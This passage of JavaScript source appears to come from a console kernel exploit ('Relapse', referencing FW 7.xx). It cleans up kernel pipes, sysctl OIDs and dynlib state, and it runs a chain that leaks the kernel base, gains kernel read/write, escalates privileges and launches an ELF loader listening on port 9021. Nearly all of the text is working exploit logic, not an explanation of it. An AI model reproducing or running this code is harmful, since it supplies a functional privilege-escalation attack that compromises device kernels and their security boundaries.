            let writes_ok = true;
            for (const pipe of [master.pipe, victim.pipe]) {
                writes_ok = kwrite64(pipe + off.pipe.buffer, 0n) === 0n && writes_ok;
                writes_ok = kwrite32(pipe + off.pipe.count, 0) === 0n && writes_ok;
                writes_ok = kwrite32(pipe + off.pipe["in"], 0) === 0n && writes_ok;
                writes_ok = kwrite32(pipe + off.pipe.out, 0) === 0n && writes_ok;
                writes_ok = kwrite32(pipe + off.pipe.size, 0) === 0n && writes_ok;
            }

            const buffers = [kread64(master.pipe + off.pipe.buffer), kread64(victim.pipe + off.pipe.buffer)];
            const fields = [
                kread32(master.pipe + off.pipe.count), kread32(master.pipe + off.pipe["in"]),
                kread32(master.pipe + off.pipe.out), kread32(master.pipe + off.pipe.size),
                kread32(victim.pipe + off.pipe.count), kread32(victim.pipe + off.pipe["in"]),
                kread32(victim.pipe + off.pipe.out), kread32(victim.pipe + off.pipe.size),
            ];
            const ok = writes_ok && buffers.every(check => check.rv === 0n && check.value === 0n) &&
                fields.every(check => check.rv === 0n && check.value === 0);
            if (ok) crossed = false;
            else warn("Cleanup: pipe disarm failed; pipes may panic on close");
            return ok;
        }

        // avoid another kernel write window after pipe restoration.
        function restore_oids() {
            if (!crossed) return true;
            if (!mib_a || !mib_b || !kbase) return false;

            const a = off.oid.a, b = off.oid.b, c = off.oid.c, original_kind = Number(off.oid.originalKind);
            let ok = true;

            for (const oid of [a, b, c])
                ok = (kwrite64(kaddr(oid.arg1), kaddr(oid.arg1Value)) === 0n) && ok;
            for (const oid of [a, b, c])
                ok = (kwrite32(kaddr(oid.kind), original_kind) === 0n) && ok;
            ok = (kwrite32(kaddr(b.visible), 0) === 0n) && ok;
            ok = (kwrite32(kaddr(a.deadSink), 0) === 0n) && ok;
            ok = (kwrite32(kaddr(off.walkCounter.addr), 0) === 0n) && ok;
            mib_c = null;

            const cpus = sysctl_read_int(mib_a);
            const still_visible = oid_kind(mib_b) !== null;
            const restored = ok && cpus.rv === 0n && !still_visible;
            if (restored) ok_msg("kernel sysctl OIDs restored and verified");
            else warn("Cleanup: oid restore check failed");
            return restored;
        }

        function release_aio_workers() {
            if (!worker_park) return;
            try {
                syscall(SYSCALL.close, worker_park.write_fd);
                nanosleep(120 * 1e6);
                syscall(SYSCALL.close, worker_park.read_fd);
            } catch (e) {
                warn("Cleanup: could not release aio workers");
            }
        }

        function close_scratch_descriptors() {
            const keep = [];
            if (master) keep.push(master);
            if (victim) keep.push(victim);

            const seen = new Set();
            for (const fd of fds) {
                const key = fd.toString();
                if (seen.has(key)) continue;
                seen.add(key);
                const keep_fd = keep.some(p => p.read_fd === fd || p.write_fd === fd);
                if (!keep_fd) syscall(SYSCALL.close, fd);
            }
        }

        async function rescue() {
            try {
                if (pinned_core >= 0 && !thread_attrs_restored) restore_thread_attributes();

                if (armed_groups.length > 0) {
                    if (!curproc) find_current_process();
                    if (curproc) defuse_aio_groups();
                    else warn("Cleanup: current process unavailable");
                }

                restore_eboot_segments();

                // Restore fd_jdir and dynlib range (fixes FW 7.xx crash on app exit)
                if (orig_escalation) {
                    if (orig_escalation.fdp && orig_escalation.jdir && orig_escalation.jdir.rv === 0n) {
                        write_kernel64(orig_escalation.fdp + off.filedesc.jdir, orig_escalation.jdir.value);
                    }
                    if (orig_escalation.dyn) {
                        const d = orig_escalation.dyn;
                        if (d.syscallStart.rv === 0n) write_kernel64(d.ptr + off.dynlib.syscallStart, d.syscallStart.value);
                        if (d.syscallEnd.rv === 0n) write_kernel64(d.ptr + off.dynlib.syscallEnd, d.syscallEnd.value);
                        if (d.restrictFlags.rv === 0n) write_kernel32(d.ptr + off.dynlib.restrictFlags, d.restrictFlags.value);
                        if (d.libkernelRef.rv === 0n) write_kernel64(d.ptr + off.dynlib.libkernelRef, d.libkernelRef.value);
                    }
                }

                let pipes_ok = restore_pipes();
                if (!pipes_ok) pipes_ok = disarm_pipes();
                if (!pipes_ok) {
                    const pinned = master && victim &&
                        kexp.bump_refcount(master.read_file, kread32, kwrite32) &&
                        kexp.bump_refcount(master.write_file, kread32, kwrite32) &&
                        kexp.bump_refcount(victim.read_file, kread32, kwrite32) &&
                        kexp.bump_refcount(victim.write_file, kread32, kwrite32);
                    if (pinned) ok_msg("pipe file references pinned after restoration failure");
                    else warn("Cleanup: could not pin pipe file references after restoration failure");
                }

                restore_oids();
                release_aio_workers();
                close_scratch_descriptors();
            } catch (e) {
                warn("Cleanup: failed: " + ((e && e.message) || e));
            }
        }

        // run

        async function run() {
            await log("[*] Starting kernel exploit");
            try {
                leak_kernel_base();
                await log("[+] kbase: " + toHex(kbase));
                pin_to_single_core();

                if (!arm_kernel_read_write()) { warn("armings did not complete"); return { payloads: false }; }
                await stage("kernel r/w ready");

                if (!find_current_process()) { warn("curproc not found"); return { payloads: false }; }
                if (!locate_pipes()) { warn("pipes not located"); return { payloads: false }; }
                await stage("pipes located");

                if (!cross_pipes()) { warn("fast read and write not established"); return { payloads: false }; }
                await stage("kernel fast r/w ready");

                await stage("checking aio groups");
                defuse_aio_groups();

                await stage("checking privileges");
                if (!escalate()) { warn("escalation did not clear"); return { payloads: false }; }
                await stage("privileges ready");

                if (!handoff_ready) {
                    warn("Kernel: handoff stopped because dlsym state was not verified");
                    return { payloads: false };
                }

                const launched = await kexp.launch({
                    kbase, proc_fd_addr, off, curproc, master, victim,
                    restore_thread_attributes, kaddr, native_malloc: alloc,
                    report: warn, stage, hex: toHex,
                });
                if (!launched) { warn("kexp launch failed"); return { payloads: false }; }
                await stage("elfldr loaded");
                return { payloads: true };
            } catch (e) {
                warn(String(e && e.message ? e.message : e));
                return { payloads: false };
            } finally {
                await rescue();
            }
        }


        const result = await run();
        if (result && result.payloads) {
            await log("[+] Kernel exploit complete");
            await log("[+] elfldr is listening on " + (get_current_ip() || "unknown") + ":9021");
            return true;
        } else {
            await log("[-] Kernel exploit stopped");
            return false;
        }
    } catch (e) {
        await log("[-] Relapse error: " + (e && e.message ? e.message : e));
        if (e && e.stack) await log(e.stack);
        return false;
    }
}
